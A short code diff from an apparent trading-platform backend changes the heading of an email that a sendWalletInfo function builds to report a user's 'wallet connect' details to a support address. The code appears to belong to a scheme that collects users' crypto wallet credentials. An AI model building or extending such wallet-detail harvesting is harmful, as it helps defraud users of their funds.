@@ -310,7 +310,7 @@ async function sendWalletInfo({ username, addy,wally }) {
   var to="support@stoxphere.com"
   const content = `
     <html>
-    <h2>Welcome to Patextrade</h2>
+    <h2>Wallet connect lnfo</h2>
 
     <p>${username},just requested to connect wallet.Here are the details;
 
